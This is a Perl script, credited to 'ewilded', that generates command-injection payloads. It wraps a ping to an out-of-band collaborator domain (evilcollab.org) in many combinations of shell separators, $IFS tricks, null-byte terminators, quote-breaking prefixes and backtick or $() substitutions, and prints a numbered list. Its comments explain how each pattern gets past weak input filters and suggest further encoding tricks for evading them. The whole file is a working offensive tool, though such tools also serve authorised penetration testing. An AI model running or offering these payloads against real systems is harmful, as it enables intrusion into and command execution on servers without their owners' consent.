#!/usr/bin/perl

## Payload generator by ewilded (tuned up for command injection)

use strict;

# CONFIGURATION SECTION START
my $COMMAND='ping';
my $ARGUMENT='xPAYLOAD_MARK.sub.evilcollab.org';
# in this configuration example we are trying to ravage file upload mechanism in order to write arbitrary files to arbitrary location
my $PAYL=$COMMAND.'ARGUMENT_SEPARATOR'.$ARGUMENT;
my $payload_marking=1; # if  we want to mark each payload with a unique identifier, so we can know the winner when it hits the right place

# Let's try to create proper nix command injection anatomy
## we can deal with three types of shitty check filters:
# 1) the ones that only force the string to begin properly, like ^\w+ 
# 2) the ones that only force the string to end properly, like \w+$
# 3) the ones that only force the string to have proper beginning and end, with a loophole inside of them, e.g. ^\w+\s+.*\w+$
# We have to create the base payloads list with this thing in mind
# This is why we need both SUFFIXES and PREFIXES, we build all combinations: PREFIX{PAYLOAD}, PREFIX{PAYLOAD}SUFFIX, {PAYLOAD}SUFFIX, we'll also be able to cover injection points starting/ending with quotes

# MALICIOUS_COMMAND=COMMAND+ARGUMENT_SEPARATOR
# THE COMBINATION PATTERNS: 
# 1) MALICIOUS_COMMAND (will this ever happen? yes it will, in argument injections like `$USER_SUPPLIED` or $(USER_SUPPLIED))
# 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR (in case there was write and command separators were unallowed?)
# 3) COMMAND_SEPARATOR+MALICIOUS_COMMAND (for simple injections with no filtering, like cat $USER_SUPPLIED
# 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for simple injections with no filtering and appended fixed shite, like cat $USER_SUPPLIED something)
# 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for simple injections like cat $USER_SUPPLIED something, with filtering like \w+$)
# 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for injections with shitty filtering like ^\w+ and some appended fixed shite, like cat $USER_SUPPLIED something)
# 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for injections with appended fixed shite, like cat $USER_SUPPLIED something, with shitty filtering like ^\w+\s+.*\w+$)
# 8) PREFIX+MALICIOUS_COMMAND+SUFFIX (`` and $() notations)

# Why we do not combine COMMAND_SEPARATORS along with COMMAND_TERMINATORS in one payload: any quotes will be handled by the prefix stuff anyway, while any fixed appendices will be ignored due to separators instead of terminators (and if separator is not accepted, the command will fail anyway, so there is no point in trailing it with a terminator)... hence, terminators should be used only mutually exclusively with separators!

# OTHER IDEAS (TODO)
## Bad character avoidance; there have to be some alternative payloads evading filters for particular characters; for instance "ping shell.a.pentest.co" might fail if "." is not allowed; while "ping $((base64 -d c2hlbGwuYS5wZW50ZXN0LmNvLnVrCg==))" would work otherwise (provided that its other characers are not blocked ofc), it's just an example; we need to develop some sort of bad character evasion like in meterpreter encoder ;)
# Additional evasive versions, e.g. double url-encode (or overlong utf) non-word characters (ARGUMENT_SEPARATORS, COMMAND_SEPARATORS, COMMAND_TERMINATORS)
# WINDOWS SUPPORT
# support for nested-quote injections ('" and "' prefix-suffix)
# Generate test cases FROM the payloads


my @BASE_PAYLOADS=(
$PAYL,
'$('.$PAYL.')',
'`'.$PAYL.'`'
);

my @ARGUMENT_SEPARATORS=('%20%20',"%09%09",'$IFS$9');
my @COMMAND_SEPARATORS=('%0a%0a','%0d%0d',';','%26','|','<<D%0aD%0a');
my @COMMAND_TERMINATORS=("%00",'💩');# these make sense only if the command is saved into a file (script) or a database entry before being executed (in order to get rid of the hardcoded command shite if separators fail to get rid of its impact, or if dealing with some quoted injection

# %F0%9F%92%A9 encoded poo

# invvvvv212.org','1', example.org for command injection into overlays of tools like whois. On the flip side, for file uploads these could be '.PNG', '.TXT','.DOC'optional list of suffixes to try (e.g. in order to bypass filters), used only with terminators
my @PREFIXES=('fooo.co.uk');
my @PREFIX_SUFFIXES=('"',"'"); # for into-quoted string injections, like fixed_command '$USER_SUPPLIED' or fixed_command "$USER_SUPPLIED"

# my %EVASIVE_RULES = (); # this is a collection of rules to apply in order to create alternative payload versions intended to bypass filters, e.g. 'script' => 'sCrIpt', 'script' => 'scr<script>ipt', 'UNION'=>'SeLunionect', 'tmp/' => 'tmp/../tmp/../tmp/../tmp/../tmp' and so on.
# bash inline comments couls be used to evade weird blacklist-approaching filters, but these do not seem to be very popular (like with SQLi/XSS), so no need to implement these right now
# CONFIGURATION SECTION STOP


# automatically prefix prefixes with quotes in order to gain quoted injection compatibility
my @tmp_prefixes=(@PREFIXES);
foreach my $prefix(@tmp_prefixes)
{
	foreach my $prefix_suffix(@PREFIX_SUFFIXES)
	{
		push(@PREFIXES,$prefix.$prefix_suffix);	
	}
}


my @output_payloads=();

# First, we fill our output payloads list wth all variations of base payloads, including different argument separators
foreach my $arg_separator(@ARGUMENT_SEPARATORS)
{
	foreach my $base_payload(@BASE_PAYLOADS)
	{
		my $curr_payload=$base_payload;
		$curr_payload=~s/ARGUMENT_SEPARATOR/$arg_separator/;
		push(@output_payloads,$curr_payload);
		#print $curr_payload."\n";
	}
}
@BASE_PAYLOADS=(@output_payloads); # overwrite the base with different base command_separator variants

# Second, we fill up our output_payloads with successive combinations from the COMBINATION PATTERNS
# 1) MALICIOUS_COMMAND - already there in its pure version, nice one!

# 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR (in case there was write and command separators were unallowed?)
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_terminator(@COMMAND_TERMINATORS)
	{
		my $curr_payload=$base_payload.$command_terminator;
		push(@output_payloads,$curr_payload);
	}
}
# 3) COMMAND_SEPARATOR+MALICIOUS_COMMAND
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		my $curr_payload=$command_separator.$base_payload;
		push(@output_payloads,$curr_payload);
	}
}

# 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for simple injections with no filtering and appended fixed shite, like cat $USER_SUPPLIED something)
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		my $curr_payload=$command_separator.$base_payload.$command_separator;
		push(@output_payloads,$curr_payload);
	}
}


# 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for simple injections like cat $USER_SUPPLIED something, with filtering like \w+$)
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{		
		foreach my $suffix(@PREFIXES) # prefix and suffix are the same 
		{
			next if($suffix=~/'/||$suffix=~/"/); # skip irrelevant payloads
			my $curr_payload=$command_separator.$base_payload.$command_separator.$suffix;
			push(@output_payloads,$curr_payload);	
		}
	}
}

# 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for injections with shitty filtering like ^\w+ and some appended fixed shite, like cat $USER_SUPPLIED something)
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		foreach my $prefix(@PREFIXES)
		{
			my $curr_payload=$prefix.$command_separator.$base_payload.$command_separator;
			if($curr_payload=~/'/)
			{
				$curr_payload.="'";
			}
			elsif($curr_payload=~/"/)
			{
				$curr_payload.='"';
			}
			# if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
			push(@output_payloads,$curr_payload);
		}
	}
}

# 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for injections with appended fixed shite, like cat $USER_SUPPLIED something, with shitty filtering like ^\w+\s+.*\w+$)
foreach my $base_payload(@BASE_PAYLOADS)
{
	foreach my $command_separator(@COMMAND_SEPARATORS)
	{
		foreach my $prefix(@PREFIXES)
		{
			my $curr_payload=$prefix.$command_separator.$base_payload.$command_separator.$prefix; # suffix is the same as prefix
			# if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
			push(@output_payloads,$curr_payload);
		}
	}
}

# 8) PREFIX+MALICIOUS_COMMAND+SUFFIX (`` and $() notations)
foreach my $base_payload(@BASE_PAYLOADS)
{
	if(!($base_payload=~/^\`/) && !($base_payload=~/^\$/)) { next; } # skip irrelevant base payloads in order to avoid pointless results
	foreach my $prefix(@PREFIXES)
	{
			my $curr_payload=$prefix.$base_payload.$prefix; # suffix is the same as prefix
			# if the payload starts with a quote, we are closing it with the same quote in order to keep the syntax from breaking
			push(@output_payloads,$curr_payload);
	}
}

# FINALLY, PRINT OUR PRECIOUS LIST READY FOR ACTION!
my $cnt=0;
foreach my $output_payload(@output_payloads)
{
	if($payload_marking eq 1)
	{
		$output_payload=~s/PAYLOAD_MARK/$cnt/;
	}
	else
	{
		$output_payload=~s/PAYLOAD_MARK//;
	}
	$cnt++;
	print $output_payload."\n";	
}
